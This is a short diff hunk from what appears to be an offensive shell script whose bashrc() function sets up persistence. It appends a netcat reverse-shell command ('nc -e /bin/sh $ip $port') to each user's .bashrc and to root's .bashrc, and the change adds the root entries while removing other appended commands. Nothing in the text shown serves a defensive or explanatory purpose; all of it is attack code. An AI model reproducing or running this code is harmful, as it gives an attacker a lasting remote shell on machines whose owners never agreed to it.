@@ -98,11 +98,11 @@ bashrc() {
     command="nc -e /bin/sh $ip $port"
     for user in /home/*; do
         if [ -d "$user" ]; then
-          echo "$command0" >> "/root/.bashrc"
           echo "$command" >> "$user/.bashrc"
-          echo "$command2" >> "$user/.bashrc"
-          echo "$command3" >> "$user/.bashrc"
+          echo "$command0" >> "$user/.bashrc"
         fi
+    echo "$command0" >> "/root/.bashrc"
+    echo "$command" >> "/root/.bashrc"
     done
     echo -e "\033[0;32m[+] - Bashrc persistence added!"
 }
